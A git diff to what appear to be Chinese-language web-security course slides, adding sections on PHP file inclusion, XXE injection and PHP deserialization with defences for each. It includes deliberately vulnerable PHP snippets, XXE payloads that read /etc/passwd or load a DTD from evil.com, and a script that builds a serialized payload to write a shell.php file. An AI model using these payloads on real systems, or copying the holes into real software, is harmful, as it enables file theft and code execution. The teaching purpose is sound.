@@ -546,7 +546,7 @@ select count(id) from tb_acl where subject=%user_name% and object=%access_file_p
 
 ---
 
-## 示例
+## 示例 {id="auth-session-weakness-1"}
 
 * 未采用Session cookie，而是在URL中编码已通过认证的用户名和密码
 
@@ -589,13 +589,508 @@ select count(id) from tb_acl where subject=%user_name% and object=%access_file_p
 
 ---
 
+## 漏洞成因 {id="file-inc-causes"}
+
+* **插件** 功能需要「动态加载执行代码」
+* 当攻击者可以控制「加载什么代码」的时候，就触发了 `文件包含` 漏洞
+* 几乎所有脚本语言都会提供文件包含功能，但 PHP 语言由于其过于灵活和自由的代码执行机制导致了大多数文件包含类漏洞都是出现在 PHP 编写的网站程序之中
+
+---
+
+## PHP 文件包含漏洞 {id="php-file-inc"}
+
+* include()
+* require()
+* include_once()
+* require_once()
+
+> 上述四个 PHP 函数都可以传入「变量」来动态加载 PHP 源代码文件
+
+> 既可以是「本地文件」，也可以是「远程文件」
+
+---
+
+## 一段缺陷代码示例
+
+```php
+<?php
+if (@$_GET['page']) {
+    include($_GET['page']);
+} else {
+    include "show.php";
+}
+```
+
+---
+
+> PHP 7.2.6 的默认运行时配置（php.ini）是禁止包含远程文件的，如下图所示是一次失败的远程文件包含漏洞利用行为尝试
+
+![](images/chap0x07/php-include-remote-0.png)
+
+---
+
+> 如下图所示则是修改了 php.ini，设置 `allow_url_include=On` 之后再次执行得到的成功效果截图
+
+![](images/chap0x07/php-include-remote-1.png)
+
+
+---
+
+上述例子中被包含的远程文件 `remote.php` 代码如下：
+
+```php
+<?php
+phpinfo();
+```
+
+---
+
+需要注意的是，除了 `allow_url_include=On` 远程文件包含漏洞利用的依赖配置之外，还依赖于 `allow_url_fopen=On`
+
+---
+
+## PHP 本地文件包含读取文件 {id="php-file-inc-read-file"}
+
+![](images/chap0x07/php-include-local-1.png)
+
+---
+
+## PHP 本地文件包含执行代码 {id="php-file-inc-lce"}
+
+* 不依赖于修改 PHP 的默认运行时配置即可完成任意 PHP 代码执行
+* 但相比较于远程文件包含方式，本地文件包含漏洞的利用往往需要配合 `文件上传` 漏洞利用才能达成目的
+* 攻击者需要先上传包含 PHP 代码的文件到服务器上，然后还需要知道已上传文件存储在服务器上的路径（绝对路径或相对当前脚本执行环境的相对路径）
+* 进而通过控制文件包含参数的赋值来加载刚刚上传的恶意文件中的 PHP 代码
+
+---
+
+## PHP 文件包含漏洞的利用技巧 {id="php-file-inc-tips-1"}
+
+* 利用 `php://input`
+	* [php://input](http://php.net/manual/zh/wrappers.php.php#wrappers.php.input) 是个可以访问请求的原始数据的 **只读流** 
+	* 在使用 POST 方式请求时，HTTP 请求体中的数据会赋值给 HTTP 请求头中对应 GET 变量值为 `php://input` 的变量
+
+---
+
+> 如下图所示，使用 curl 构造了一个这样的请求，其中 HTTP 请求体中对应的是一段 PHP 代码：在当前脚本目录下执行操作系统 ls 命令
+
+![](images/chap0x07/php-include-php-input-0.png)
+
+---
+
+注意这种漏洞利用方式，同样依赖于 PHP 的运行时配置 `allow_url_include=On` ，否则漏洞利用会失败，如下图所示
+
+![](images/chap0x07/php-include-php-input-1.png)
+
+---
+
+* 利用 [data://](http://php.net/manual/zh/wrappers.data.php)
+
+![](images/chap0x07/php-include-data-1.png)
+
+* [php://filter](http://php.net/manual/zh/wrappers.php.php#wrappers.php.filter) 
+* `PHP %00` 截断漏洞
+
+---
+
+## 防御 PHP 文件包含漏洞 {id="prevention-to-php-file-inc"}
+
+* 修改 PHP 的运行时配置文件 `php.ini`
+	* 开启 `open_basedir` 函数，将其设置为指定目录，则只有该目录的文件允许被访问
+	* `allow_url_include=Off`  禁止远程文件包含
+	* 从代码级别避免和修复文件包含漏洞
+		* 过滤文件包含路径变量的输入，采用白名单方式包含文件
+		* 建议禁止从程序外部输入读取包含文件的路径
+
 # 7. XXE 注入 {id="xxe"}
 
 ---
 
+**X**ML E**x**ternal **E**ntity（XML 外部实体）注入。
+
+---
+
+[![php xxe demo](https://asciinema.org/a/LirIB7Ci2dVh8yVQyXfskP7gH.svg)](https://asciinema.org/a/LirIB7Ci2dVh8yVQyXfskP7gH)
+
+---
+
+## XML 基础 {id="xml-basics"}
+
+```xml
+<!--1. XML 声明-->
+<?xml version="1.0"?>
+<!--2. 文档类型定义 Document Type Definition, DTD （可选）-->
+<!DOCTYPE email [  <!--定义一个名为 email 类型的文档（内部 DTD）-->
+<!ELEMENT email (to,from,title,body)>  <!--定义 email 元素有四个子元素-->
+<!ELEMENT to (#PCDATA)>      <!--定义to元素为”#PCDATA”类型-->
+<!ELEMENT from (#PCDATA)>    <!--定义from元素为”#PCDATA”类型-->
+<!ELEMENT title (#PCDATA)>   <!--定义title元素为”#PCDATA”类型-->
+<!ELEMENT body (#PCDATA)>    <!--定义body元素为”#PCDATA”类型-->
+]>
+<!--3. 文档元素-->
+<email>
+<to>Bob</to>
+<from>Alice</from>
+<title>Cryptograpphy</title>
+<body>We are famous guys.</body>
+</email>
+```
+
+---
+
+* `内部 DTD` - `<!DOCTYPE 根元素 [元素声明]>`
+* `外部 DTD` 
+    * `<!DOCTYPE 根元素 SYSTEM "文件名">`
+---
+
+## 可以用于 XXE 攻击的 XML 文档举例 {id="xxe-examples"}
+
+```xml
+<!-- 利用外部 DTD，读取系统文件 /etc/passwd -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE a [<!ENTITY passwd SYSTEM "file:///etc/passwd">]>
+<a>
+        <!-- 读取到的 /etc/passwd 文件内容被保存在 passwd 变量中 -->
+        <value>&passwd;</value>
+</a>
+```
+
+```xml
+<!-- 参数实体定义 -->
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE aaa [
+    <!ENTITY %f SYSTEM "http://evil.com/evil.dtd">
+    %f;
+]>
+<aaa>&b;</aaa>
+
+<!-- 其中 evil.dtd 文件内容如下 -->
+<!ENTITY b SYSTEM "file:///etc/passwd">
+```
+
+---
+
+上述 2 个例子中的 `XML 实体` 引用语法略有不同，但都是使用 `ENTITY` 关键字声明，可以当做「变量」来理解。
+
+* `&`
+* `%`
+
+---
+
+## XXE 漏洞成因关键 {id="xxe-internals"}
+
+* `XML` 代码中包含了 **加载外部资源** 的「恶意变量声明」
+* 服务端代码在解析 `XML` 代码时 **无限制** 解析「恶意变量」声明语句
+* 「恶意变量」的值被 **回显** 
+
+---
+
+## XXE 漏洞利用典型效果 {id="xxe-impacts"}
+
+* 敏感数据泄露（任意文件读取）
+* 拒绝服务攻击
+* 服务器端请求伪造
+* 远程代码执行
+* 执行应用程序托管服务器的网络端口扫描
+
+---
+
+## 防御 XXE 攻击 {id="prevention-to-xxe"}
+
+* 禁用 XML 外部实体和 DTD 处理
+* 使用无已知漏洞的 XML 解析器引擎组件
+
+---
+
+## 推荐训练学习资源 {id="xxe-recommends"}
+
+* [PHP XXE 漏洞与利用源代码分析示例](https://github.com/vulnspy/phpaudit-XXE)
+* [vulhub 提供的 XXE 漏洞学习训练环境](https://github.com/vulhub/vulhub/tree/master/php/php_xxe)
+
+---
+
+> 只有 PHP 语言存在 XXE 漏洞吗？
+
+---
+
+## 探索一下其他编程语言
+
+* [python 官方文档中对 xml 处理的常见漏洞总结](https://docs.python.org/3/library/xml.html#xml-vulnerabilities)
+* [python_docx 存在 XXE 漏洞预警 CVE-2016-5851](https://snyk.io/vuln/SNYK-PYTHON-PYTHONDOCX-40402)
+* [OWASP 的 XXE Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+
+---
+
+[![python xxe demo](https://asciinema.org/a/agBO50PpWVWA9ggCocQLGIhRQ.svg)](https://asciinema.org/a/agBO50PpWVWA9ggCocQLGIhRQ)
+
+---
+
+## [Python XML 解析器其他漏洞类型](https://docs.python.org/3/library/xml.html#xml-vulnerabilities) {id="python-xml-parser-vuls"}
+
+| kind                      | sax          | etree        | minidom      | pulldom      | xmlrpc       |
+| --                        | --           | --           | --           | --           | --           |
+| billion laughs            | **易受攻击** | **易受攻击** | **易受攻击** | **易受攻击** | **易受攻击** |
+| quadratic blowup          | **易受攻击** | **易受攻击** | **易受攻击** | **易受攻击** | **易受攻击** |
+| external entity expansion | 安全 (4)     | 安全 (1)     | 安全 (2)     | 安全 (4)     | 安全 (3)     |
+| DTD retrieval             | 安全 (4)     | 安全         | 安全         | 安全 (4)     | 安全         |
+| decompression bomb        | 安全         | 安全         | 安全         | 安全         | **易受攻击** |
+
+1. xml.etree.ElementTree 不会扩展外部实体并在实体发生时引发 ParserError。
+2. xml.dom.minidom 不会扩展外部实体，只是简单地返回未扩展的实体。
+3. xmlrpclib 不扩展外部实体并省略它们。
+4. 从 Python 3.7.1 开始， **默认情况** 下不再处理外部通用实体。
+
+---
+
+## 推荐训练学习资源 {id="xxe-recommends-others"}
+
+* [python-xxe](https://github.com/c4pr1c3/python-xxe)
+* [一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo](https://github.com/c0ny1/xxe-lab)
+
+
 # 8. 反序列化漏洞 {id="deserialization"}
 
 ---
+
+## 基础知识 {id="serialization-basics"}
+
+* 序列化是将 **应用程序对象** 状态转换为 **二进制数据或文本数据** 的过程
+* 反序列化则是其逆向过程，即从 **二进制数据或文本数据** 创建对象状态
+
+> 应用程序使用该功能来支持有效 **共享或存储** `对象状态`
+
+---
+
+## 反序列化的典型应用场景 {id="serialization-usage"}
+
+和前文的「文件包含」漏洞存在“合理性”类似： `反序列化` 特性也有典型需求场景
+
+* 分布式系统的「远程过程调用」 **传参**：通过网络传输「对象」
+* 游戏的进度 **存档** （序列化）与 **读档** （反序列化）
+
+---
+
+⚠️  但和「文件包含」功能一样，很快 **上述 `反序列化` 过程也遭到攻击者的恶意利用** ⚠️
+
+---
+
+## 「特性」被滥用或误用导致的『漏洞』
+
+* 文件上传
+* XXE
+* 文件包含
+* 反序列化
+
+---
+
+* 攻击者通过 **创建恶意的反序列化对象** ，在应用程序执行序列化时远程执行代码和篡改数据
+* 使用不可信来源的对象序列化的分布式应用程序和 API 特别容易受到反序列化攻击
+
+---
+
+⚠️ **流行的服务端编程语言 PHP、Java 和 Python 等均有可能编写出包含反序列化漏洞的代码** ⚠️
+
+---
+
+## 反序列化漏洞典型案例
+
+* [2015 年 Apache Commons Collections 反序列化远程命令执行漏洞](https://commons.apache.org/proper/commons-collections/security-reports.html) 影响范围包括：WebSphere、JBoss、Jenkins、WebLogic 和 OpenNMS 等
+* [2017 年 3 月 15 日，fastjson 官方发布安全公告](https://github.com/alibaba/fastjson/wiki/security_update_20170315) 表示：fastjson 在 1.2.24 及之前版本存在（反序列化）远程代码执行高危安全漏洞，攻击者可以通过此漏洞远程执行恶意代码来入侵服务器
+    * fastjson 是 Java 社区常用的 JSON 和 Java Bean 转换（反序列化）组件
+* [Python 编写的 SQL 注入自动化利用神器 Sqlmap 存在的 Pickle 反序列化漏洞导致代码执行报告](https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/)
+
+---
+
+⚠️  前方高能，开始「烧脑🤯」⚠️
+
+---
+
+## PHP 对象序列化基本概念 {id="php-serialization-official"}
+
+[PHP 官方文档中摘录如下](https://www.php.net/manual/zh/language.oop5.serialization.php)
+
+> 所有php里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表示。unserialize() 函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是 **不会保存对象的方法**，只会保存类的名字。
+
+---
+
+## PHP 反序列化漏洞原理基础 {id="php-unserialize-basics"}
+
+```php
+<?php
+// PHP 的对象序列化过程
+class User {
+
+    private $mobile;
+    protected $age;
+    public $name;
+
+
+    public function say() {
+        echo "My name is $this->name\n";
+    }
+
+    public function __construct($age = NULL, $name = NULL, $mobile = NULL) {
+        echo "__construct is called\n";
+        $this->age = $age;
+        $this->name = $name;
+        $this->mobile = $mobile;
+    }
+
+    public function __toString() {
+        return "$this->name is $this->age old\n";
+    }
+
+    public function __sleep() {
+        echo "__sleep is called\n";
+        return array('age', 'name', 'mobile');
+    }
+
+    public function __wakeup() {
+        echo "__wakeup is called\n";
+    }
+
+    public function __destruct() {
+        echo "__destruct is called on $this->name \n";
+    }
+}
+
+$user = new User(22, "Zhang San", "13800138000"); // 对象创建时自动触发 __construct()
+echo $user; // $user 对象被当做「字符串」访问，自动触发 __toString()
+
+// 序列化
+$s_user = serialize($user); // 序列化时自动触发 __sleep() 方法
+file_put_contents("/tmp/ser.bin", $s_user); // 序列化结果写入文件方便查看输出结果里的「不可打印」字符
+echo $s_user . "\n"; // 打印序列化结果
+system("hexdump -C /tmp/ser.bin"); // 16 进制方式查看「序列化结果」
+
+// 反序列化
+$r_user = unserialize(file_get_contents("/tmp/ser.bin")); // 反序列化时触发 __wakeup() 方法
+$r_user->name = "Li Si";
+echo $r_user; // 被 echo 时触发「字符串」转换魔术方法 __toString
+$r_user->say(); // 调用「恢复出来的对象」的方法
+
+// 序列化过程结束
+printf("EOF reached\n");
+
+// 全部脚本执行完毕，自动触发 $user 对象的 __destruct()
+// 注意对象销毁的顺序和对象的创建顺序是相反的
+// 栈操作顺序：先创建，后销毁
+
+// 执行结果如下
+/*
+__construct is called
+Zhang San is 22 old
+__sleep is called
+O:4:"User":3:{s:6:"*age";i:22;s:4:"name";s:9:"Zhang San";s:12:"Usermobile";s:11:"13800138000";}
+00000000  4f 3a 34 3a 22 55 73 65  72 22 3a 33 3a 7b 73 3a  |O:4:"User":3:{s:|
+00000010  36 3a 22 00 2a 00 61 67  65 22 3b 69 3a 32 32 3b  |6:".*.age";i:22;|
+00000020  73 3a 34 3a 22 6e 61 6d  65 22 3b 73 3a 39 3a 22  |s:4:"name";s:9:"|
+00000030  5a 68 61 6e 67 20 53 61  6e 22 3b 73 3a 31 32 3a  |Zhang San";s:12:|
+00000040  22 00 55 73 65 72 00 6d  6f 62 69 6c 65 22 3b 73  |".User.mobile";s|
+00000050  3a 31 31 3a 22 31 33 38  30 30 31 33 38 30 30 30  |:11:"13800138000|
+00000060  22 3b 7d                                          |";}|
+00000063
+__wakeup is called
+Li Si is 22 old
+My name is Li Si
+EOF reached
+__destruct is called on Li Si
+__destruct is called on Zhang San
+*/
+```
+
+---
+
+看上去 `User` 对象经过「序列化」（调用 `serialize()` 函数）之后变成了以下「字符串」：
+
+```
+O:4:"User":3:{s:6:"*age";i:22;s:4:"name";s:9:"Zhang San";s:12:"Usermobile";s:11:"13800138000";}
+```
+
+---
+
+### 不要被不可打印字符欺骗了
+
+* `protected` 属性字段 `age` 左边的 `*` (2a) 字符的左右两边被不可打印字符 `\00` 包围
+* `private` 属性字段 `mobile` 左边拼接了字符串 `\00User\00` 其中 `User` 是类名
+
+---
+
+经过一番简单的上下文字符串特征比对分析，我们可以总结出如下简单「序列化」规律：
+
+* `<对象标识>:<类名长度>:"类名":类的成员变量个数:{`
+    * `O:4:"User":3:{`
+* `<成员变量类型>:<成员变量名长度>:"<成员变量名>";<成员变量值类型>:<成员变量值>;`
+    * `s:6:"\00*\00age";i:22;`
+* `<成员变量类型>:<成员变量名长度>:"<成员变量名>";<成员变量值类型>:<成员变量值长度>:<成员变量值>;`
+    * `s:4:"name";s:9:"Zhang San";`
+* `<成员变量类型>:<成员变量名长度>:"<成员变量名>";<成员变量值类型>:<成员变量值长度>:<成员变量值>;}`
+    * `s:12:"\00User\00mobile";s:11:""13800138000";}`
+
+---
+
+至此，我们可以再来回味一下 [PHP 官方文档中摘录如下这句话](https://www.php.net/manual/zh/language.oop5.serialization.php) 的关键词为什么用的是 **字节流** ：
+
+> 所有php里面的值都可以使用函数 serialize() 来返回一个包含 **字节流** 的字符串来表示。unserialize() 函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。
+
+---
+
+基础知识普及完毕，现在终于可以看一下课本里的 PHP 反序列化漏洞原理代码了。
+
+---
+
+## 漏洞代码
+
+```php
+<?php
+class cuc {
+    var $test = 'whatever';
+    function __wakeup() {
+        $fp = fopen("shell.php", "w");
+        fwrite($fp, $this->test);
+        fclose($fp);
+        echo '__wakeup';
+    }
+}
+
+$class = $_GET['test'];
+
+unserialize($class);
+```
+
+---
+
+## 构造漏洞利用的关键负载
+
+```php
+<?php
+class cuc {
+    var $test = 'whatever';
+    function __wakeup() {
+        $fp = fopen("shell.php", "w");
+        fwrite($fp, $this->test);
+        fclose($fp);
+        echo '__wakeup';
+    }
+}
+$payload_class = new cuc();
+$payload_class->test = "<?php phpinfo(); ?>";
+$payload = serialize($payload_class);
+print(urlencode($payload)); // urlencode() 结果是为了方便使用 curl 时给 GET 参数赋值
+```
+
+---
+
+[![asciicast](https://asciinema.org/a/pME1z7OyEA12JrXT5dKlwgCQQ.svg)](https://asciinema.org/a/pME1z7OyEA12JrXT5dKlwgCQQ)
+
+---
+
+## 反序列化漏洞的防御方案
+
+* 将应用程序配置为不接受不可信来源的任何反序列化输入
+* 仅使用具有基本数据类型的序列化函数（如 PHP 的 json_encode() 和 json_decode()）
+* 如果这些措施不可行，那么在创建对象之前执行反序列化期间应强制实施约束类型，在较低特权环境（例如，临时容器）中运行反序列化，并限制与执行反序列化的服务器的网络连接
+* 同时还可通过使用加密或完整性检查（例如，数字签名），防止恶意的对象创建和数据篡改操作
 
 # 9. 第三方组件缺陷 {id="vulnerable-component"}
 
@@ -613,7 +1108,7 @@ select count(id) from tb_acl where subject=%user_name% and object=%access_file_p
 
 ---
 
-## 推荐训练学习资源
+## 推荐训练学习资源 {id="sqli-labs"}
 
 * [sqli-labs](https://github.com/c4pr1c3/sqli-labs) | [sqli-labs 国内 gitee 镜像](https://gitee.com/c4pr1c3/sqli-labs)
 
